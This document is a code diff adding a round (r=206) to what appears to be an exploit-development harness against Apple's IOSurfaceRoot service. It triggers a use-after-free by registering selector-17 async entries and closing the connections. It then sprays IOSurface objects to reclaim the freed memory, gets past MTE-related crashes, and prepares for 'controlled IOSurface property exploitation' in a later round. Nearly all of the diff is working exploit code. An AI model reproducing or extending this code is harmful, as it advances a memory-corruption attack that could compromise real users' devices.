@@ -24978,6 +24978,163 @@ new_modes:
                 rlog("=== r=205 complete ===\n");
             }
 
+            /* r=206: Same-type reclaim — stabilize UAF with real IOSurface spray
+             *
+             * Instead of grooming freed registry entries with fake addresses
+             * (which MTE defeats), we spray REAL IOSurface objects to reclaim
+             * the freed memory. The compositor then reads valid, correctly-tagged
+             * IOSurface objects and survives without panicking.
+             *
+             * This proves the UAF can be stabilized, setting up for controlled
+             * reads via IOSurface properties in later rounds.
+             *
+             * Usage: iosurface_sel17 206 [spray_count] [race_rounds]
+             *   spray_count: number of surfaces to spray (default 200)
+             *   race_rounds: number of UAF trigger attempts (default 20)
+             */
+            if (rounds == 206) {
+                rlog("\n=== r=206: Same-type reclaim UAF stabilization ===\n");
+                int r206_spray = 200;
+                int r206_races = 20;
+                if (argc > 3) r206_spray = atoi(argv[3]);
+                if (argc > 4) r206_races = atoi(argv[4]);
+                if (r206_spray < 10) r206_spray = 10;
+                if (r206_spray > 1000) r206_spray = 1000;
+                if (r206_races < 1) r206_races = 1;
+                if (r206_races > 100) r206_races = 100;
+                rlog("  Spray count: %d  Race rounds: %d\n", r206_spray, r206_races);
+
+                io_service_t r206_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r206_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r206_done; }
+
+                /* Pre-create surface properties dict (reused for all sprays) */
+                CFMutableDictionaryRef r206_props = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int r206_w = 32, r206_h = 32, r206_bpe = 4;
+                CFNumberRef r206_wn = CFNumberCreate(NULL, kCFNumberIntType, &r206_w);
+                CFNumberRef r206_hn = CFNumberCreate(NULL, kCFNumberIntType, &r206_h);
+                CFNumberRef r206_bn = CFNumberCreate(NULL, kCFNumberIntType, &r206_bpe);
+                int r206_pf = 0x42475241;
+                CFNumberRef r206_pfn = CFNumberCreate(NULL, kCFNumberIntType, &r206_pf);
+                CFDictionarySetValue(r206_props, CFSTR("IOSurfaceWidth"), r206_wn);
+                CFDictionarySetValue(r206_props, CFSTR("IOSurfaceHeight"), r206_hn);
+                CFDictionarySetValue(r206_props, CFSTR("IOSurfaceBytesPerElement"), r206_bn);
+                CFDictionarySetValue(r206_props, CFSTR("IOSurfacePixelFormat"), r206_pfn);
+
+                int r206_survived = 0;
+                int r206_panicked = 0; /* we can only count these if we survive */
+
+                for (int race = 0; race < r206_races; race++) {
+                    rlog("\n  --- Race attempt %d/%d ---\n", race + 1, r206_races);
+
+                    /* Step 1: Open multiple connections and register entries */
+                    io_connect_t r206_conns[8];
+                    int r206_nconns = 0;
+                    for (int i = 0; i < 8; i++) {
+                        io_connect_t c = IO_OBJECT_NULL;
+                        if (IOServiceOpen(r206_svc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
+                            r206_conns[r206_nconns++] = c;
+                        }
+                    }
+                    rlog("  Opened %d connections\n", r206_nconns);
+
+                    /* Register entries on each connection */
+                    for (int i = 0; i < r206_nconns; i++) {
+                        mach_port_t wp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0xD206 + i;
+                        uint64_t inp[3] = {1, 2, 3};
+                        IOConnectCallAsyncMethod(r206_conns[i], 17, wp, &ref, 1,
+                            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), wp);
+                    }
+                    rlog("  Registered %d entries\n", r206_nconns);
+
+                    /* Step 2: Close connections to free registry entries (UAF trigger) */
+                    for (int i = 0; i < r206_nconns; i++) {
+                        IOServiceClose(r206_conns[i]);
+                    }
+                    rlog("  Freed entries (closed connections)\n");
+
+                    /* Step 3: IMMEDIATELY spray real IOSurfaces to reclaim freed memory */
+                    IOSurfaceRef *r206_surfs = calloc(r206_spray, sizeof(IOSurfaceRef));
+                    int r206_created = 0;
+                    for (int i = 0; i < r206_spray; i++) {
+                        r206_surfs[i] = IOSurfaceCreate(r206_props);
+                        if (r206_surfs[i]) r206_created++;
+                    }
+                    rlog("  Sprayed %d/%d IOSurfaces\n", r206_created, r206_spray);
+
+                    /* Also register new entries via sel17 to reclaim registry entry slots */
+                    io_connect_t r206_reg_conn = IO_OBJECT_NULL;
+                    IOServiceOpen(r206_svc, mach_task_self(), 0, &r206_reg_conn);
+                    mach_port_t r206_reg_wps[256];
+                    int r206_reg_n = 0;
+                    if (r206_reg_conn) {
+                        for (int i = 0; i < 256 && i < r206_spray; i++) {
+                            mach_port_t wp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                            mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0x206000 + i;
+                            uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
+                            IOConnectCallAsyncMethod(r206_reg_conn, 17, wp, &ref, 1,
+                                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                            r206_reg_wps[r206_reg_n++] = wp;
+                        }
+                        rlog("  Registered %d new entries via sel17\n", r206_reg_n);
+                    }
+
+                    /* Step 4: Run render loop — this triggers compositor registry walk */
+                    rlog("  Starting render loop (3s)...");
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r206_rt;
+                    pthread_create(&r206_rt, NULL, p13_render_loop, NULL);
+                    for (int s = 0; s < 3; s++) {
+                        usleep(1000000);
+                        rlog(" +%ds", s + 1);
+                    }
+                    p13_render_run = 0;
+                    pthread_join(r206_rt, NULL);
+                    rlog(" frames=%d\n", p13_render_frames);
+
+                    rlog("  *** SURVIVED race attempt %d! frames=%d ***\n",
+                         race + 1, p13_render_frames);
+                    r206_survived++;
+
+                    /* Cleanup spray */
+                    for (int i = 0; i < r206_spray; i++) {
+                        if (r206_surfs[i]) CFRelease(r206_surfs[i]);
+                    }
+                    free(r206_surfs);
+                    if (r206_reg_conn) {
+                        IOServiceClose(r206_reg_conn);
+                        for (int i = 0; i < r206_reg_n; i++)
+                            mach_port_deallocate(mach_task_self(), r206_reg_wps[i]);
+                    }
+                    usleep(100000);
+                }
+
+                rlog("\n=== r=206 RESULTS ===\n");
+                rlog("  Survived: %d/%d race attempts\n", r206_survived, r206_races);
+                if (r206_survived == r206_races) {
+                    rlog("  FULL SURVIVAL — same-type reclaim is working!\n");
+                    rlog("  Next: r=207 for controlled IOSurface property exploitation\n");
+                } else {
+                    rlog("  Partial survival — reclaim probability may need tuning\n");
+                }
+
+                CFRelease(r206_wn); CFRelease(r206_hn);
+                CFRelease(r206_bn); CFRelease(r206_pfn);
+                CFRelease(r206_props);
+                IOObjectRelease(r206_svc);
+
+                r206_done:
+                rlog("=== r=206 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
